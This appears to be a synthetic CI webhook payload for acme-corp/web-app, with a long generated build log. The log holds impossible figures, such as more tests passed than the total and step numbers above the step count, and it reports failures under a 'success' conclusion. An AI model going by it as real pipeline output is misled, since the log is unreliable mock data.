{
  "action": "completed",
  "workflow_run": {
    "id": 536,
    "name": "CI Pipeline",
    "head_branch": "develop",
    "head_sha": "853ee82d7a8107a27f74ef8ff1dfc780f6b6fc34",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-11-24T12:19:08.815481Z",
    "updated_at": "2025-11-24T12:22:06.000246Z"
  },
  "repository": {
    "full_name": "acme-corp/web-app",
    "name": "web-app"
  },
  "sender": {
    "login": "frank"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: unit_tests ===\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 2/19: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nChecking out develop branch\nStep 1/21: Testing\nTests: 455 passed, 68 total\nCompiling lib/app.ts...\npip: Collecting eslint\nCompiling lib/index.js...\nCompiling lib/service.java...\nPulling image: alpine:18\nWARNING: axios has known vulnerabilities\n[12:19:08] DEBUG: Initializing service\nPOST /api - 202 (55ms)\nFetching submodules...\nTest Suites: 18 passed, 8 total\nCompleted.\n[12:19:08] DEBUG: Loading configuration\nPlatform: darwin-arm64\nDone.\n\u2713 lint completed\nCreating production build...\nDone.\n  PASS: test_api_health (418ms)\n[12:19:08] WARN: Deprecated API usage\nTests: 342 passed, 225 total\n  PASS: e2e/test_db_connect.spec.js\nnpm notice: created a lockfile\nTLS handshake completed\nTests: 376 passed, 137 total\nWaiting...\nTests: 423 passed, 436 total\nReady.\n[12:19:08] WARN: Deprecated API usage\n[12:19:08] INFO: Cache refreshed\nGenerating source maps...\nEnvironment: production\nCache miss for key-4297\n[12:19:08] INFO: Starting build process\nCoverage: 91% statements, 65% branches\n[12:19:08] WARN: Deprecated API usage\nRan 86 tests in 33s\nArtifact uploaded: build.tar.gz (24MB)\nnpm notice: package.json updated\n[12:19:08] INFO: Request completed\nCache saved successfully\nLayer 7/15: COPY command\nCache restored successfully (54MB)\nFetching submodules...\nProcessing...\n[12:19:08] DEBUG: Connection pool: 8 active\n\u2713 Step 'build' succeeded\nnpm install: added 491 packages\nGenerating source maps...\n[12:19:08] DEBUG: Query executed in 16ms\nSnapshots: 17 passed, 38 total\nCache miss for key-6698\n[12:19:08] INFO: Connecting to database\nCompiling lib/handler.rs...\n[12:19:08] DEBUG: Loading configuration\nCompiling src/app.ts...\nnpm notice: package.json updated\n[12:19:08] INFO: Request completed\npip: Collecting prettier\nCompiling utils/index.js...\n[12:19:08] INFO: Cache refreshed\nCoverage: 94% statements, 97% branches\n[12:19:08] WARN: Deprecated API usage\nChecking out develop branch\nArtifact downloaded: 15MB\nTransforming 543 files...\nSwitched to branch 'bugfix/task-890'\n\u2717 build failed with exit code 29\nConnecting to startup.dev:443...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nyarn add: Done in 21.44s\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nOK\nTime: 27.948s\nTime: 105.777s\n\u2713 validate completed\n  PASS: unit/test_db_connect.spec.js\nnpm install: resolved 1682 packages\nWaiting...\nCache hit for key-7235\n[12:19:08] DEBUG: Memory usage: 988MB\nStep 14/21: Testing\nPushing to registry...\nPushing to registry...\nSnapshots: 40 passed, 25 total\nTLS handshake completed\nHEAD is now at 9177c67\n[12:19:08] DEBUG: Memory usage: 1036MB\nTLS handshake completed\nStep 19/25: Building\nConnecting to acme.corp:443...\nCompleted.\nCache saved successfully\nLoading...\n[12:19:08] WARN: Deprecated API usage\nLayer 4/10: ENV command\nTransforming 381 files...\nFinished.\n[12:19:08] DEBUG: Memory usage: 987MB\nBundling main.css\nUsing Node.js 20.13.4\nBundling main.css\nStep 19/18: Running migrations\n[12:19:08] DEBUG: Initializing service\nChecking out main branch\nLayer 1/9: ENV command\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTransforming 591 files...\nCache hit for key-6735\n\u2717 build failed with exit code 101\nCompleted.\n[12:19:08] WARN: Deprecated API usage\nCoverage: 88% statements, 66% branches\n[12:19:08] INFO: Cache refreshed\nLoading...\nArtifact downloaded: 15MB\n[12:19:08] ERROR: Connection failed\nFinished.\npip install: Successfully installed lodash-5.18\nCompiling src/main.py...\nDone.\nSnapshots: 20 passed, 17 total\n\u2713 Task completed in 3926ms\nProcessing...\npip: Installing build dependencies...\nArtifact uploaded: dist.zip (78MB)\nCache restored successfully (325MB)\nCache invalidated: build\nPOST /upload - 202 (293ms)\nCache hit for key-5913\nConnection established\nPlatform: win32-x64\nNODE_ENV=development\nInstalling express@2.7.6\nSuccess!\nStep 17/21: Deploying\n  PASS: e2e/test_auth_login.spec.js\n[12:19:08] DEBUG: Query executed in 22ms\nPulling image: alpine:3.11\n[12:19:08] INFO: Processing request\npip: Installing build dependencies...\nWARNING: eslint has known vulnerabilities\n[12:19:08] DEBUG: Memory usage: 1240MB\n  PASS: test_api_health (477ms)\nEnvironment: development\nCompiling src/app.ts...\nStep 13/21: Testing\n  PASS: unit/test_cache_hit.spec.js\n[12:19:08] INFO: Request completed\nArtifact uploaded: build.tar.gz (47MB)\npip: Collecting express\nCache miss for key-1511\n\u2713 Step 'build' succeeded\nNODE_ENV=test\nCache invalidated: build\nLayer 7/15: COPY command\npip install: Successfully installed express-1.3\nCreating production build...\nFinished.\n=== Step unit_tests completed ===\n=== Step: restore_cache ===\nCompiling lib/app.ts...\nCompiling src/app.ts...\nCache invalidated: dependencies\nGenerating source maps...\nInstalling eslint@1.15.10\nCache restored successfully (188MB)\n[12:19:08] INFO: Cache refreshed\nTransforming 831 files...\n[12:19:08] WARN: Deprecated API usage\nEnvironment: production\nUsing Python 3.9\nTLS handshake completed\nWARNING: lodash has known vulnerabilities\nBuilding Docker image...\n[12:19:08] DEBUG: Memory usage: 1589MB\nSuccess!\nWaiting...\nMinifying main.js\nBundling vendor.js\nStep 20/24: Building\nSuccess!\nChecking out develop branch\nProcessing...\nVerifying...\nFAILED: test_cache_hit\nCache miss for key-8617\nGenerating source maps...\nGET /api - 201 (26ms)\nWARNING: lodash has known vulnerabilities\nCompleted.\nWaiting...\nWARNING: axios has known vulnerabilities\nConnection established\n[12:19:08] WARN: Deprecated API usage\nPushing to registry...\nTransforming 699 files...\nDone.\n[12:19:08] ERROR: Connection failed\nHEAD is now at 1e1ca7a\n\u2713 Step 'checkout' succeeded\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nFinished.\nBundling main.js\nBuilding Docker image...\nCache restored successfully (392MB)\npip: Downloading webpack-1.20.tar.gz\nProcessing...\nHEAD is now at 3938032\nFAILED: test_auth_login\nReady.\n\u2713 validate completed\nStep 4/25: Testing\nBuilding Docker image...\nLoading...\nArtifact uploaded: dist.zip (72MB)\nUsing Node.js 19.10.0\nCreating production build...\nWARNING: eslint has known vulnerabilities\nTest Suites: 21 passed, 25 total\nGenerating source maps...\n\u2713 lint completed\nReady.\nBundling vendor.js\nCompleted.\nCoverage: 80% statements, 82% branches\nMinifying app.js\nGET /status - 201 (43ms)\nCompiling utils/index.js...\n[12:19:08] INFO: Cache refreshed\n\u2713 validate completed\nnpm install: resolved 1296 packages\nLoading...\n\u2713 build completed\nArtifact uploaded: build.tar.gz (14MB)\nPulling image: python:latest\nnpm install: added 397 packages\nConnection established\nPOST /data - 200 (106ms)\nStep 20/16: Building\n[12:19:08] WARN: Deprecated API usage\n  PASS: integration/test_api_health.spec.js\nEnvironment: production\nSuccess!\nChecking out develop branch\nNODE_ENV=development\nnpm install: resolved 574 packages\nPOST /upload - 201 (202ms)\n[12:19:08] INFO: Connecting to database\nCache hit for key-2807\npip: Installing build dependencies...\nLayer 4/8: RUN command\nBundling main.js\nTime: 115.800s\nCompiling src/main.py...\n[12:19:08] DEBUG: Loading configuration\n[12:19:08] WARN: Deprecated API usage\nHEAD is now at 55019db\n\u2713 Step 'checkout' succeeded\nMinifying app.js\nTests: 289 passed, 79 total\n[12:19:08] WARN: Deprecated API usage\nCache hit for key-5729\nBundling styles.css\n[12:19:08] DEBUG: Memory usage: 1458MB\nFinished.\nBundling runtime.css\nTransforming 995 files...\nCache restored successfully (493MB)\nStep 19/15: Installing dependencies\nHEAD is now at f2b657e\n[12:19:08] DEBUG: Memory usage: 407MB\n[12:19:08] WARN: Deprecated API usage\n[12:19:08] DEBUG: Loading configuration\n[12:19:08] DEBUG: Connection pool: 4 active\nCache restored successfully (34MB)\nUsing Python 3.9\nUsing Python 3.9\nArtifact uploaded: build.tar.gz (46MB)\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nPlatform: win32-x64\nStep 12/17: Testing\nUsing Python 3.10\nArtifact uploaded: dist.zip (48MB)\nStep 11/25: Deploying\nCreating production build...\nWARNING: express has known vulnerabilities\n\u2713 All checks passed\nPushing to registry...\nCache invalidated: dependencies\nyarn add: Done in 30.40s\nPlatform: linux-x64\nStep 6/16: Running migrations\nException: RuntimeError\nSwitched to branch 'bugfix/task-742'\nCreating production build...\nCompleted.\nHEAD is now at 3875f95\nPOST /upload - 202 (242ms)\nStep 14/24: Building\nWARNING: jest has known vulnerabilities\n[12:19:08] INFO: Cache refreshed\n  PASS: test_auth_login (283ms)\n\u2713 validate completed\nCreating production build...\n\u2713 validate completed\nUploading artifact 'dist' (47 files)\nPulling image: node:18\nMinifying vendor.js\nStep 1/24: Deploying\n[12:19:08] INFO: Processing request\nTest Suites: 25 passed, 41 total\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nHEAD is now at 986e408\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache saved successfully\nCoverage: 91% statements, 96% branches\nPulling image: alpine:latest\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 Task completed in 168ms\n[12:19:08] DEBUG: Query executed in 25ms\nImage pulled successfully\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n=== Step restore_cache completed ===\n=== Step: setup_environment ===\npip: Installing build dependencies...\nCompiling components/utils.go...\nAlready up to date.\n  PASS: test_cache_hit (441ms)\nBuilding Docker image...\nStep 7/20: Linting\nCache saved successfully\nnpm notice: package.json updated\nSuccess!\nStep 8/24: Installing dependencies\nConnecting to cloud.services:443...\nStep 15/16: Running migrations\npip: Downloading webpack-4.4.tar.gz\nFAILED: test_user_create\nImage pulled successfully\nWaiting...\nStep 8/16: Testing\nHEAD is now at 13803b9\nNODE_ENV=production\n[12:19:08] INFO: Starting build process\nWaiting...\nTLS handshake completed\n[12:19:08] WARN: Deprecated API usage\n[12:19:08] DEBUG: Connection pool: 6 active\nyarn add: Done in 8.61s\nException: ValueError\nProcessing...\nArtifact downloaded: 21MB\nnpm notice: package.json updated\n[12:19:08] DEBUG: Query executed in 95ms\n[12:19:08] DEBUG: Initializing service\nCache hit for key-9525\nFAILED: test_user_create\nCompiling lib/service.java...\nPOST /upload - 200 (416ms)\nStep 1/15: Deploying\nStep 5/17: Testing\nSwitched to branch 'hotfix/task-957'\nPushing to registry...\n\u2713 All checks passed\nHEAD is now at 1378d9c\n[12:19:08] ERROR: Connection failed\n[12:19:08] DEBUG: Memory usage: 889MB\npip: Collecting lodash\nReady.\npip: Collecting lodash\n[12:19:08] DEBUG: Query executed in 33ms\nStep 5/21: Installing dependencies\nArtifact downloaded: 31MB\n  PASS: e2e/test_user_create.spec.js\nyarn add: Done in 12.85s\nStep 18/23: Testing\nNODE_ENV=development\n[12:19:08] DEBUG: Query executed in 91ms\nStep 11/17: Linting\nDone.\nCompiling lib/app.ts...\nRan 195 tests in 46s\nTest Suites: 15 passed, 49 total\n[12:19:08] INFO: Starting build process\nSuccess!\nTLS handshake completed\nCompiling components/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 1/19: Testing\nTime: 22.278s\nSwitched to branch 'bugfix/task-895'\nSuccess!\nnpm notice: package.json updated\nPOST /data - 202 (496ms)\nProcessing...\nUsing Node.js 16.5.3\nWARNING: axios has known vulnerabilities\n[12:19:08] INFO: Processing request\nFAILED: test_cache_hit\nHEAD is now at c629b90\nWARNING: prettier has known vulnerabilities\n\u2713 package completed\nInstalling eslint@3.17.5\nAlready up to date.\n[12:19:08] INFO: Starting build process\n[12:19:08] INFO: Request completed\nTransforming 446 files...\nOptimizing 14 modules...\npip: Installing build dependencies...\n[12:19:08] INFO: Connecting to database\nCache invalidated: node_modules\n[12:19:08] DEBUG: Connection pool: 16 active\nCreating production build...\n[12:19:08] INFO: Connecting to database\n  PASS: integration/test_auth_login.spec.js\nWARNING: eslint has known vulnerabilities\nSuccess!\nCache invalidated: build\nConnecting to startup.dev:443...\nTLS handshake completed\nImage pulled successfully\nStep 13/20: Installing dependencies\n[12:19:08] DEBUG: Connection pool: 18 active\nConnecting to startup.dev:443...\nCompiling utils/utils.go...\nStep 10/22: Deploying\nFAILED: test_db_connect\nStep 3/18: Building\nCoverage: 87% statements, 74% branches\n[12:19:08] INFO: Request completed\n[12:19:08] WARN: Deprecated API usage\n\u2717 build failed with exit code 91\nVerifying...\nSnapshots: 38 passed, 17 total\nNODE_ENV=development\nCache restored successfully (369MB)\nUsing Node.js 14.17.10\nCache miss for key-8724\nDone.\nnpm notice: created a lockfile\nPOST /data - 201 (256ms)\nArtifact uploaded: build.tar.gz (33MB)\nCache hit for key-2479\nEnvironment: test\nFetching submodules...\nStep 12/21: Building\nWARNING: eslint has known vulnerabilities\nOK\n[12:19:08] INFO: Processing request\nCompiling src/utils.go...\nArtifact uploaded: dist.zip (35MB)\nWaiting...\nVerifying...\nNODE_ENV=test\nGenerating source maps...\nnpm notice: created a lockfile\n[12:19:08] WARN: Deprecated API usage\npip install: Successfully installed react-1.19\nnpm install: resolved 632 packages\n[12:19:08] DEBUG: Query executed in 4ms\nnpm install: added 448 packages\nChecking out main branch\nnpm install: resolved 1065 packages\nTLS handshake completed\n[12:19:08] INFO: Starting build process\nStep 12/15: Building\nTLS handshake completed\nGenerating source maps...\nUsing Node.js 17.20.6\nCreating production build...\nOK\nConnecting to cloud.services:443...\nCreating production build...\nStep 17/21: Building\nOptimizing 67 modules...\nCompiling lib/index.js...\nArtifact uploaded: dist.zip (41MB)\nImage pulled successfully\n\u2717 build failed with exit code 80\nArtifact downloaded: 17MB\nPOST /data - 200 (48ms)\nTest Suites: 48 passed, 28 total\nFAILED: test_user_create\nCache saved successfully\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCoverage: 76% statements, 83% branches\nnpm install: added 231 packages\nnpm notice: created a lockfile\nArtifact uploaded: build.tar.gz (2MB)\n=== Step setup_environment completed ===\n=== Step: setup_node ===\n[12:19:08] INFO: Cache refreshed\nCompiling src/main.py...\n\u2713 All checks passed\nSuccess!\n\u2713 Task completed in 1598ms\nArtifact downloaded: 23MB\nPOST /api - 201 (412ms)\nArtifact uploaded: dist.zip (15MB)\n[12:19:08] INFO: Cache refreshed\nCompleted.\nVerifying...\n[12:19:08] DEBUG: Connection pool: 6 active\n[12:19:08] INFO: Request completed\n\u2717 build failed with exit code 106\nTime: 86.875s\nCompiling utils/app.ts...\nCache saved successfully\nFetching submodules...\nPushing to registry...\nnpm install: resolved 793 packages\nConnecting to acme.corp:443...\nMinifying app.js\nnpm notice: package.json updated\nAlready up to date.\n  PASS: unit/test_auth_login.spec.js\nUsing Node.js 15.14.5\nFetching submodules...\nRan 36 tests in 15s\nChecking out master branch\nnpm notice: created a lockfile\nCompiling utils/handler.rs...\n\u2713 Step 'build' succeeded\nUploading artifact 'coverage' (26 files)\nUploading artifact 'build' (13 files)\npip: Downloading jest-5.7.tar.gz\n  PASS: test_api_health (473ms)\npip: Downloading jest-2.9.tar.gz\n[12:19:08] INFO: Connecting to database\n[12:19:08] DEBUG: Connection pool: 16 active\nInstalling react@1.3.9\nnpm notice: package.json updated\n[12:19:08] WARN: Deprecated API usage\n[12:19:08] WARN: Deprecated API usage\n[12:19:08] INFO: Connecting to database\nOptimizing 58 modules...\nGET /health - 204 (35ms)\nFinished.\nAlready up to date.\nConnecting to test.io:443...\n[12:19:08] DEBUG: Initializing service\n[12:19:08] DEBUG: Memory usage: 687MB\nRan 108 tests in 48s\n[12:19:08] DEBUG: Memory usage: 124MB\nMinifying main.js\nCompleted.\nTransforming 597 files...\n\u2713 Task completed in 4636ms\nConnection established\n[12:19:08] DEBUG: Initializing service\nnpm notice: package.json updated\nInstalling webpack@1.17.9\nFinished.\n[12:19:08] INFO: Connecting to database\n[12:19:08] WARN: Deprecated API usage\nPulling image: node:latest\nSnapshots: 15 passed, 31 total\nCompiling components/service.java...\nBuilding Docker image...\nWARNING: prettier has known vulnerabilities\nTime: 84.318s\nRan 93 tests in 30s\nLoading...\nCompleted.\nTransforming 860 files...\nGenerating source maps...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:19:08] INFO: Connecting to database\nMinifying app.js\nConnection established\nCreating production build...\nCreating production build...\nCache invalidated: build\nyarn add: Done in 29.59s\nStep 1/21: Testing\nWARNING: lodash has known vulnerabilities\nOK\npip: Collecting eslint\n\u2713 Step 'install' succeeded\n  PASS: test_user_create (321ms)\nEnvironment: production\n[12:19:08] WARN: Deprecated API usage\nGET /status - 200 (79ms)\nTests: 388 passed, 326 total\n[12:19:08] DEBUG: Query executed in 94ms\n[12:19:08] INFO: Processing request\nVerifying...\n[12:19:08] DEBUG: Query executed in 35ms\nTime: 5.172s\nPlatform: linux-x64\nCache invalidated: node_modules\nStep 15/17: Linting\nCoverage: 93% statements, 72% branches\nVerifying...\nProcessing...\nTLS handshake completed\nEnvironment: production\nOptimizing 21 modules...\nTest Suites: 16 passed, 35 total\n\u2713 Step 'setup' succeeded\npip: Collecting express\nCompiling lib/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWARNING: axios has known vulnerabilities\nyarn add: Done in 27.59s\n[12:19:08] DEBUG: Loading configuration\nOptimizing 84 modules...\nStep 6/21: Linting\n[12:19:08] INFO: Cache refreshed\nWARNING: express has known vulnerabilities\nCompiling components/service.java...\nHEAD is now at de50d08\n[12:19:08] INFO: Request completed\nWARNING: jest has known vulnerabilities\nCompiling components/app.ts...\nCompiling lib/index.js...\nnpm notice: created a lockfile\nnpm install: added 409 packages\nConnection established\nLoading...\nCache hit for key-5074\nPlatform: win32-x64\nWaiting...\nInstalling lodash@1.12.9\n\u2713 Task completed in 124ms\nStep 8/24: Testing\nTests: 399 passed, 145 total\nFAILED: test_user_create\nLoading...\n\u2713 Step 'build' succeeded\nStep 8/18: Testing\nGenerating source maps...\nSnapshots: 36 passed, 1 total\nCache invalidated: dependencies\nArtifact uploaded: build.tar.gz (35MB)\nyarn add: Done in 19.30s\nSwitched to branch 'bugfix/task-419'\n\u2713 All checks passed\n[12:19:08] WARN: Deprecated API usage\n[12:19:08] INFO: Request completed\nCompiling components/app.ts...\nLoading...\nProcessing...\nSuccess!\nCompiling utils/utils.go...\nReady.\nCache restored successfully (60MB)\nGenerating source maps...\nImage pulled successfully\n[12:19:08] WARN: Deprecated API usage\nCoverage: 77% statements, 80% branches\nCache miss for key-9941\nStep 8/18: Linting\nTransforming 345 files...\n  PASS: test_user_create (240ms)\n  PASS: test_user_create (16ms)\n=== Step setup_node completed ===\n=== Step: upload_artifacts ===\nCompiling lib/service.java...\nTLS handshake completed\nCache hit for key-7717\nCache saved successfully\nArtifact uploaded: build.tar.gz (13MB)\nException: RuntimeError\nWaiting...\nChecking out develop branch\n\u2713 Step 'checkout' succeeded\nStep 15/16: Testing\n[12:19:08] ERROR: Connection failed\nTime: 51.613s\nArtifact uploaded: dist.zip (16MB)\nUsing Python 3.12\nFinished.\nBundling runtime.js\nHEAD is now at 8dec56b\n\u2713 All checks passed\nOK\nInstalling jest@3.19.6\n[12:19:08] DEBUG: Initializing service\n  PASS: test_auth_login (399ms)\nCache hit for key-1327\nStep 5/19: Running migrations\nCompiling components/index.js...\nUploading artifact 'build' (48 files)\nProcessing...\n  PASS: test_auth_login (297ms)\nSuccess!\nWARNING: react has known vulnerabilities\n[12:19:08] DEBUG: Connection pool: 11 active\n\u2717 build failed with exit code 75\nCompleted.\nTransforming 411 files...\n[12:19:08] DEBUG: Query executed in 37ms\n[12:19:08] INFO: Cache refreshed\nStep 12/18: Testing\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nConnecting to cloud.services:443...\npip: Installing build dependencies...\nEnvironment: staging\n[12:19:08] INFO: Starting build process\n[12:19:08] DEBUG: Connection pool: 13 active\nStep 14/25: Installing dependencies\nCompiling src/index.js...\n[12:19:08] INFO: Processing request\nReady.\nCache restored successfully (140MB)\nStep 19/19: Building\nArtifact uploaded: build.tar.gz (48MB)\nCompiling utils/service.java...\nLoading...\nReady.\n\u2713 validate completed\nSwitched to branch 'feature/task-574'\nnpm notice: created a lockfile\nImage pulled successfully\nUsing Node.js 17.1.4\nCompleted.\n[12:19:08] INFO: Connecting to database\nImage pulled successfully\nStep 2/20: Linting\nHEAD is now at 05703cb\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nTest Suites: 16 passed, 38 total\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nDone.\nCompiling components/handler.rs...\nArtifact uploaded: dist.zip (67MB)\nUsing Node.js 14.10.10\nBuilding Docker image...\npip: Installing build dependencies...\nTime: 13.142s\n\u2713 All checks passed\n[12:19:08] DEBUG: Query executed in 44ms\nConnection established\n\u2717 build failed with exit code 55\n[12:19:08] WARN: Deprecated API usage\nnpm notice: created a lockfile\nConnection established\nTests: 175 passed, 358 total\n[12:19:08] INFO: Cache refreshed\nOptimizing 76 modules...\n[12:19:08] INFO: Cache refreshed\nyarn add: Done in 1.62s\nFAILED: test_api_health\nHEAD is now at 3ed0adf\nLayer 3/8: ENV command\nEnvironment: production\nTransforming 296 files...\nUsing Python 3.10\n[12:19:08] DEBUG: Loading configuration\nStep 3/18: Installing dependencies\n  PASS: test_api_health (211ms)\nWaiting...\npip install: Successfully installed eslint-1.19\npip: Collecting lodash\nException: ValueError\nCompiling utils/service.java...\nPushing to registry...\n[12:19:08] INFO: Starting build process\nCompiling lib/handler.rs...\nAlready up to date.\nCompiling lib/index.js...\nAlready up to date.\nArtifact uploaded: dist.zip (43MB)\nHEAD is now at 5c3dbf8\n[12:19:08] INFO: Request completed\nHEAD is now at 01f99ac\nWARNING: lodash has known vulnerabilities\nCache hit for key-6123\nUsing Python 3.12\nTLS handshake completed\n[12:19:08] INFO: Starting build process\nCompiling src/main.py...\npip install: Successfully installed jest-4.15\n[12:19:08] INFO: Request completed\n[12:19:08] INFO: Connecting to database\nAlready up to date.\n[12:19:08] INFO: Processing request\nWARNING: eslint has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nFAILED: test_db_connect\nStep 16/18: Deploying\nWARNING: eslint has known vulnerabilities\nPulling image: alpine:3.11\nVerifying...\nCache invalidated: build\nFetching submodules...\nArtifact uploaded: build.tar.gz (26MB)\nLoading...\nSnapshots: 38 passed, 3 total\nWARNING: axios has known vulnerabilities\nVerifying...\nPOST /upload - 201 (19ms)\npip: Downloading webpack-4.4.tar.gz\nnpm install: resolved 1442 packages\nWaiting...\nChecking out master branch\n[12:19:08] DEBUG: Loading configuration\nSnapshots: 30 passed, 31 total\n  PASS: test_auth_login (89ms)\n[12:19:08] DEBUG: Query executed in 99ms\npip: Collecting prettier\n\u2713 Step 'install' succeeded\nHEAD is now at 6c9aa58\nPlatform: win32-x64\nCache invalidated: dependencies\nTLS handshake completed\nHEAD is now at c16f974\n[12:19:08] DEBUG: Query executed in 86ms\n[12:19:08] WARN: Deprecated API usage\nAlready up to date.\nPOST /data - 200 (397ms)\nUsing Python 3.11\nStep 14/16: Building\nOK\n[12:19:08] INFO: Request completed\nProcessing...\nHEAD is now at 50bc3fd\nUploading artifact 'dist' (40 files)\nReady.\nBuilding Docker image...\n[12:19:08] INFO: Connecting to database\nLoading...\n=== Step upload_artifacts completed ===\n=== Step: integration_tests ===\n[12:19:08] DEBUG: Memory usage: 1719MB\nChecking out master branch\n  PASS: unit/test_db_connect.spec.js\n[12:19:08] ERROR: Connection failed\nConnection established\nBuilding Docker image...\nOptimizing 39 modules...\nStep 12/15: Building\n[12:19:08] DEBUG: Memory usage: 1043MB\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:08] INFO: Starting build process\nnpm notice: package.json updated\nConnection established\nPushing to registry...\nLoading...\npip: Collecting express\nWARNING: express has known vulnerabilities\nPlatform: darwin-arm64\nEnvironment: staging\nWARNING: eslint has known vulnerabilities\nTest Suites: 33 passed, 34 total\nTests: 272 passed, 74 total\nMinifying main.js\nTLS handshake completed\nPOST /upload - 201 (346ms)\nSwitched to branch 'bugfix/task-383'\nPulling image: alpine:latest\n[12:19:08] INFO: Starting build process\n\u2713 Task completed in 1768ms\nPushing to registry...\nConnecting to startup.dev:443...\nUsing Python 3.12\nGET /api - 200 (67ms)\nMinifying vendor.js\nPushing to registry...\n[12:19:08] WARN: Deprecated API usage\nLoading...\n\u2713 test completed\n\u2713 All checks passed\n[12:19:08] ERROR: Connection failed\nPlatform: win32-x64\nCompiling src/utils.go...\nGET /api - 204 (13ms)\nWARNING: lodash has known vulnerabilities\nEnvironment: staging\nCache miss for key-7019\nNODE_ENV=test\nCache restored successfully (429MB)\nSnapshots: 23 passed, 48 total\nPulling image: node:18\nPOST /api - 201 (374ms)\nCompiling utils/handler.rs...\n  PASS: unit/test_user_create.spec.js\nFinished.\nCreating production build...\nTransforming 677 files...\nMinifying vendor.js\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 9/15: Linting\nCompiling utils/utils.go...\nOK\nUsing Python 3.10\nSuccess!\nnpm install: added 196 packages\nWARNING: express has known vulnerabilities\nPOST /data - 200 (487ms)\nProcessing...\nTests: 348 passed, 172 total\nTests: 299 passed, 375 total\n[12:19:08] DEBUG: Query executed in 11ms\n[12:19:08] INFO: Cache refreshed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWaiting...\nPOST /api - 202 (329ms)\nArtifact downloaded: 11MB\nNODE_ENV=production\n[12:19:08] INFO: Processing request\nnpm notice: created a lockfile\nLoading...\nPOST /api - 201 (279ms)\nStep 13/16: Building\nCache restored successfully (111MB)\npip: Collecting prettier\n[12:19:08] WARN: Deprecated API usage\n[12:19:08] WARN: Deprecated API usage\nyarn add: Done in 6.86s\n[12:19:08] DEBUG: Memory usage: 1553MB\nSnapshots: 26 passed, 26 total\nCompiling components/handler.rs...\nPushing to registry...\n\u2713 deploy completed\nnpm install: resolved 1593 packages\nSwitched to branch 'feature/task-396'\nConnecting to acme.corp:443...\nBuilding Docker image...\nInstalling axios@1.20.10\nConnection established\nReady.\nFetching submodules...\nCache invalidated: dependencies\nTest Suites: 30 passed, 48 total\nCache invalidated: build\nPOST /upload - 200 (91ms)\nCompleted.\n[12:19:08] DEBUG: Initializing service\nArtifact uploaded: build.tar.gz (18MB)\nPlatform: linux-x64\n[12:19:08] DEBUG: Query executed in 98ms\nFinished.\nWARNING: webpack has known vulnerabilities\nRan 141 tests in 9s\nLayer 2/12: ENV command\nRan 166 tests in 7s\nUsing Python 3.9\nArtifact downloaded: 34MB\nGenerating source maps...\nCompiling components/service.java...\nOK\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling lib/service.java...\nWaiting...\nImage pulled successfully\nCompiling src/app.ts...\nCache saved successfully\nPlatform: win32-x64\nOptimizing 33 modules...\nStep 11/15: Deploying\nImage pulled successfully\n[12:19:08] WARN: Deprecated API usage\nPushing to registry...\nImage pulled successfully\nCoverage: 90% statements, 82% branches\nnpm notice: created a lockfile\nStep 2/16: Installing dependencies\n\u2713 Task completed in 1096ms\nVerifying...\nTests: 271 passed, 235 total\n[12:19:08] WARN: Deprecated API usage\n[12:19:08] INFO: Processing request\npip: Collecting react\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nLayer 7/9: ENV command\n[12:19:08] DEBUG: Loading configuration\nStep 7/19: Building\nStep 3/15: Installing dependencies\nnpm notice: package.json updated\nSuccess!\nEnvironment: staging\nCompiling lib/utils.go...\nUploading artifact 'dist' (36 files)\nTLS handshake completed\n[12:19:08] DEBUG: Memory usage: 1959MB\nLoading...\nConnection established\n[12:19:08] DEBUG: Initializing service\nNODE_ENV=development\nUploading artifact 'coverage' (16 files)\nnpm notice: package.json updated\nBundling runtime.css\nWARNING: jest has known vulnerabilities\nBuilding Docker image...\nChecking out develop branch\nCompleted.\n\u2713 All checks passed\nTransforming 387 files...\n=== Step integration_tests completed ===\n=== Step: deploy_production ===\nStep 2/16: Building\nStep 19/23: Linting\nException: RuntimeError\n[12:19:08] INFO: Processing request\nTransforming 987 files...\nRan 68 tests in 41s\nCache invalidated: build\nCompleted.\nCompiling components/utils.go...\nCompiling src/index.js...\nBundling main.css\n[12:19:08] INFO: Starting build process\nStep 8/21: Deploying\n[12:19:08] DEBUG: Query executed in 29ms\n  PASS: unit/test_api_health.spec.js\nCache miss for key-7606\n[12:19:08] INFO: Starting build process\nTest Suites: 23 passed, 15 total\nVerifying...\nWARNING: react has known vulnerabilities\n\u2713 Step 'test' succeeded\nRan 87 tests in 50s\nWARNING: lodash has known vulnerabilities\nMinifying app.js\nDone.\n  PASS: test_auth_login (493ms)\nInstalling jest@5.16.8\nStep 12/22: Running migrations\nBundling main.js\nnpm notice: package.json updated\nCache restored successfully (391MB)\n[12:19:08] ERROR: Connection failed\nSuccess!\nStep 10/16: Testing\nHEAD is now at 90c28d7\nInstalling lodash@2.17.0\nOK\nStep 1/25: Deploying\n\u2713 Step 'build' succeeded\nCache invalidated: node_modules\n[12:19:08] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 11/17: Installing dependencies\n\u2713 Step 'checkout' succeeded\nPOST /api - 200 (185ms)\n[12:19:08] DEBUG: Initializing service\nCompiling utils/index.js...\nUploading artifact 'coverage' (16 files)\n[12:19:08] 